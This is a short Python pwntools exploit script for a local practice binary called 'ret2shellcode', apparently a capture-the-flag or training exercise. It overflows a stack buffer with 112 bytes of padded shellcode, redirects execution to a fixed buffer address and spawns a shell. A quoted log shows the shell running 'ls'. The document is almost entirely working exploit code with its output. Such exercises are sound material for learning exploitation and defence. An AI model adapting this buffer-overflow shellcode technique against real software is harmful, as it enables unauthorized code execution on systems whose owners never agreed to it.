#!/usr/bin/env python
from pwn import *

sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080 

sh.sendline(shellcode.ljust(108+4, b'A') + p32(buf2_addr))
sh.interactive()



"""
[root@ningan ret2shellcode]# python exp.py
[+] Starting local process './ret2shellcode': pid 8742
[*] Switching to interactive mode
No system for you this time !!!
bye bye ~$ ls
exp.py    ret2shellcode
$

"""